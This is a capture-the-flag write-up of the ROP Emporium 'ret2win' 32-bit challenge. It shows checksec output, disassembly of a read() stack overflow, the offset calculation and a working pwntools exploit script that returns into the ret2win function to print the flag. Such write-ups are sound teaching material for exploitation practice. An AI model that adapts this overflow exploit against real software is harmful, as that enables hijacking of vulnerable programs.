# ret2win - 32 Bit
Program execution:
```
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> <input_here>
```
Run checksec: `checksec ./ret2win32`
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
Identify useful symbols: `objdump -t ret2win32`
```
080485ad l     F .text  0000007f              pwnme
0804862c l     F .text  00000029              ret2win
```
`pwnme` and `ret2win` seem interesting, so we'll make a mental note to look out for them when reverse engineering the binary. My disassembler of choice is Binary Ninja.

Disassembling reveals that `main` calls `pwnme`
An analysis of `pwnme` shows a call to `read` that allows the unsafe reading of `0x38` bytes into a buffer at `ebp-0x28`:

```assembly
sub     esp, 0x4
push    0x38 {var_34}
lea     eax, [ebp-0x28 {var_2c}]
push    eax {var_2c} {var_38}
push    0x0
call    read

```
Recalling that the return address is stored at `ebp+0x4`, we can clearly overwrite the return address to control code flow.

Examining `ret2win` shows that it run `system('/bin/cat flag.txt')` so this is the function that we want to return into:

```assembly
0804863a  puts(0x80487f6)  {"Well done! Here's your flag:"}
08048654  return system(0x8048813)  {"/bin/cat flag.txt"}
```
So we want to fill the address space from `ebp-0x28` to `ebp+0x4` (`0x2c bytes`) with filler data, before writing the address of `ret2win` which is the function we want to return into.

Exploit script:
```python
#!/usr/bin/python3

from pwn import *

PROG_NAME = "./ret2win32"

p = process(PROG_NAME)
elf = p.elf

if args.ATTACH:
	gdb.attach(p, '''break main''')

p.recvuntil(b'> ')

payload = b'A' * (0x28 + 0x4)
payload += p32(elf.symbols['ret2win'])

p.sendline(payload)

p.interactive()
```

And we get our flag:
```
Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```